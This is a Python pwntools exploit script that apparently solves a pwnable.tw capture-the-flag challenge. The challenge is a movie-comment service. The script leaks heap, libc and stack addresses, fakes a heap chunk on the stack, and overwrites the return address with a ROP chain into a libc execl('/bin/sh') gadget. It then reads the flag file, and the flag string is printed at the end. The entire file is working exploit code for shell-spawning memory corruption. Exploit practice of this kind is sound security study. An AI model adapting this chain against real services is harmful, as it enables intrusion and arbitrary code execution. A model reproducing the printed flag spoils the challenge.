#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10204)
#r = remote('127.0.0.1', 7122)
lib = ELF('./libc.so.6')
#lib = ELF('/lib/i386-linux-gnu/libc.so.6')

def round(name, age, reason, comment, yn='y', beginning=1):
	if beginning:
		r.sendafter('Please enter your name:', name)
	r.sendlineafter('Please enter your age:', str(age))
	r.sendafter('Why did you came to see this movie?', reason)
	if beginning:
		r.sendafter('Please enter your comment:', comment)
	x = r.recvuntil('We will review them as soon as we can', drop=True)
	r.sendafter('Would you like to leave another comment? <y/n>:', yn)
	return x

for i in range(10):
	round('a', 1, 'a', 'a')

for i in range(90):
	round('a', 1, 'a', 'a', beginning=0)

x = round('a', 1, 'a', flat(
	'AAAA'*21,
))
heap = u32(x.split('\n')[3][93:97])
print 'heap:', hex(heap)

#free_got = 0x0804a018

# leak libc
x = round('a', 1, 'a', flat(
	[0]*21,
	heap,
	'AAAA',
))
y = x.split('\n')[2][8:]
libc = u32(y[4:8].ljust(4, '\0')) - 0x6827d + 0xa78
libc = ((libc>>12)<<12)+0x1000
print 'libc_base:', hex(libc)

# leak stack
x = round('a', 1, 'B'*80, 'a')
y = x.split('\n')[2][88:92]
stack = u32(y)-0x30+0x8-0x38
print 'stack:', hex(stack)

# malloc stack
round('a', 1, 
   flat(
	[0xcafe]*2,
	0, 0x41,
	[0xcafeeeee]*14,
	0x40, 0x41,
), flat(
	[0xbeeeeeef]*21,
	stack,
))

# overflow ret
'''
0x5f065 execl("/bin/sh", eax)
constraints:
esi is the address of `rw-p` area of libc
eax == NULL
'''

magic = libc+0x5f065
print 'magic:', hex(magic)
#system = libc+lib.symbols['system']
#print 'system:', hex(system)
pop_esi = libc+0x0003166d
pop_eax = libc+0x000bb364
rop = [pop_esi, libc+0x1b0000, pop_eax, 0, magic]
print map(hex, rop)
#raw_input('@')
round(flat(
	'sh\0\0',
	[0xffffffff]*16,
	rop,
), 1, 'a', 'a', yn='n')

r.sendline('cat /home/`whoami`/flag')
r.interactive()

# FLAG{Wh4t_1s_y0ur_sp1r1t_1n_pWn}
